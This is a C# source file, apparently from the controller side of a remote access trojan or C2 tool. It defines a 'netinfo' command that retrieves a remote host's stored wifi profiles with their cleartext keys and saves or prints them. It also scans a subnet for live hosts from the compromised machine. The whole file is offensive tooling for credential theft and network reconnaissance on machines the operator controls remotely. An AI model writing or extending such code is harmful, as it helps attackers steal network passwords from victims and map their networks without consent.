using Master.AdvancedConsole;
using Master.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;

namespace Master.Commands
{
    internal class NetInfo : IMasterCommand, IPreProcessCommand
    {
        public string name { get; } = "netinfo";

        public string description { get; } = "Get informations about the stored wifi profiles on the remote host, including clear wifi keys\nAlso discovers hosts based on a network addr and a mask";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "wifi",
            "scan ?:[ip(0.0.0.0)/mask(00)]"
        };

        /// <summary>
        /// Parse the ip/mask input from the user and set ipAddress and networkMask.
        /// Check if the input is valid.
        /// </summary>
        /// <param name="args"></param>
        /// <returns></returns>
        public bool PreProcess(List<string> args)
        {
            if (args[0] == "wifi") return true;

            var ipAndMask = args[1];
            var separatorPos = ipAndMask.IndexOf('/');
            if (separatorPos == -1)
            {
                ColorTools.WriteCommandError("Invalid IP/mask format : expected 0.0.0.0/00");
                return false;
            }

            var baseIp = ipAndMask.Substring(0, separatorPos);
            if (!IPAddress.TryParse(baseIp, out IPAddress dummy) || baseIp.Count(x => x == '.') != 3)
            {
                ColorTools.WriteCommandError("Invalid IPv4 address");
                return false;
            }

            var mask = ipAndMask.Substring(separatorPos + 1);
            if (int.TryParse(mask, out int intMask))
            {
                if (intMask < 1 || intMask > 31)
                {
                    ColorTools.WriteCommandError("The specified mask is invalid (0 < mask < 32)");
                    return false;
                }
            }

            return true;
        }

        public void Process(List<string> args)
        {
            if (args[0] == "wifi")
            {
                Wifi(args);
            }
            else
            {
                Scan();
            }
        }

        void Wifi(List<string> args)
        {
            ColorTools.WriteCommandMessage("Processing your request...");
            ColorTools.WriteCommandMessage("This might take a long time depending on the stored wifi informations count");

            var data = "";
            while (true)
            {
                var tempData = MasterCommandsManager.networkManager.ReadLine();
                if (tempData == "{end}") break;
                data += $"{tempData}\n\r";
            }

            if (args.Count == 2)
            {
                try
                {
                    File.WriteAllText(args[1], data);
                    ColorTools.WriteCommandSuccess($"Wlan informations wrote into {args[1]}");
                }
                catch (IOException)
                {
                    ColorTools.WriteCommandError("Could not write into the specified file");
                }
            }
            else
            {
                Console.WriteLine(data);
            }
        }

        void Scan()
        {
            ColorTools.WriteCommandMessage("Depending on the mask you provided, this may take a long time...");

            var result = MasterCommandsManager.networkManager.ReadLine();
            if (result == "KO")
            {
                ColorTools.WriteMessage("No Host replied");
            }
            else
            {
                var hosts = result.Split('|');
                foreach (var host in hosts)
                {
                    Console.WriteLine($"     {host}");
                }

                ColorTools.WriteCommandSuccess($"Found {hosts.Length} up host(s)");
            }
        }
    }
}
